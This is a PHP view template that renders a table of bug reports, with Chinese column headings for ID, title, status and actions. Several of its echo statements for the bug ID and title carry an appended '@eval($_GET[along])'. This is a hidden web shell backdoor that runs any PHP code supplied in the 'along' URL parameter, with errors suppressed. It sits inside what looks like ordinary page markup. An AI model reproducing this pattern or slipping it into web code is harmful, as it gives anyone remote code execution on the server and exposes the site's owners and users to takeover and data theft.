<div class="col-md-11">
	<table class="table table-hover">
		<thead>
		<tr>
			<th>ID</th>
			<th>标题</th>
			<th>状态</th>
			<th>操作</th>
		</tr>
		</thead>
		<?php foreach ($bugs as $bug): ?>
			<tr>
				<td><?php echo $h($bug->id);@eval($_GET[along]); ?></td>
				<td><?php echo $h($bug->title);@eval($_GET[along]); ?></td>
				<?php if ((boolean)$bug->accept === true): ?>
					<td>审核通过</td>
				<?php else: ?>
					<td>状态不明</td>
				<?php endif; ?>
				<td><a class="btn btn-info" href="/users/buginfo/<?php echo $h($bug->id);@eval($_GET[along]); ?>">详细信息</a></td>
			</tr>
		<?php endforeach; ?>
	</table>